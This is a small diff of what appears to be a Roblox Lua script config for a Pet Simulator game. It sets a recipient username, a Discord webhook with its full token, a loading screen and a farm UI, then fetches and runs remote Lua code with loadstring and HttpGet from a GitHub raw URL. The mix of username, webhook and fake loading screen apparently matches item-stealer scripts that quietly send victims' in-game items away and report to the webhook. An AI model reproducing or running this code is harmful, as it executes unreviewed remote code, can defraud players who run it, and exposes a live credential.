@@ -1,6 +1,6 @@
 Username = "Propiggybook"
-webhook = "https://discord.com/api/webhooks/1203565453318819840/mcJApFemHz-p635CQwEGjIw7xVao6DZ0cExI4EkPP0SDorX_7nPZSDibL5S7_-E7Qfpzwebhook here"
+webhook = "https://discord.com/api/webhooks/1203565453318819840/mcJApFemHz-p635CQwEGjIw7xVao6DZ0cExI4EkPP0SDorX_7nPZSDibL5S7_-E7Qfpzwebhook"
 loadingscreen = true
-delay = 3
+delay = 1 
 farmui = true
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
